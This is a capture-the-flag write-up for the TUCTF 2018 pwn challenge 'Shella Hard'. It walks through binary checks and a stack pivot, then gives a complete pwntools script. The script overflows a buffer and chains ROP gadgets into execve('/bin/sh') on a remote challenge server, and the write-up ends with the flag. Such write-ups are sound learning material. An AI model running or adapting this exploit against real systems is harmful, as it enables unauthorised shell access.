[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=stack-pivot,buffer-overflow,rop)
[](tools=radare2,gdb-peda,pwntools,python)

# Shella Hard

We are given a [binary](../shella-hard) with `NX` enabled and a stack based buffer overflow.

```bash
vagrant@amy:~/share/shella_hard$ file shella-hard
shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped
```

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

The binary has `execve` in the binary's GOT which allows us to easily create a ROP chain to get a shell.

```bash
vagrant@amy:~/share/shella_hard$ objdump -R shella-hard

shella-hard:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   execve@GLIBC_2.0
```

The initial read is too small for a ROP chain and therefore we have to retun to `read` and write our ROP chain using a stack pivot. Any 'rw-' section of the binary can be used for storing the ROP chain.

```python
from pwn import *

context(arch='i386', os='linux')
# p = process('./shella-hard')
p = remote('3.16.169.157', 12345)

execve = 0x08048320
cmd = 0x8048500 # /bin/sh
stack = 0x0804a000 + 600 # rw- + stack space. it's
# crashing in ld.so for some reason if stack space is small
read_main = 0x08048443 # lea eax, ebp-0x10

payload = ''
payload += 'a' * 0x10
payload += p32(stack) # overwrites ebp
payload += p32(read_main)
payload += p32(100)

p.sendline(payload)

payload = ''
payload += 'a' * 0x10
payload += 'a' * 4
payload += p32(execve)
payload += 'a' * 4
payload += p32(cmd)
payload += p32(0x0)
payload += p32(0x0)

p.sendline(payload)
p.interactive()
```

Flag
> TUCTF{175_wh475_1n51d3_7h47_c0un75}
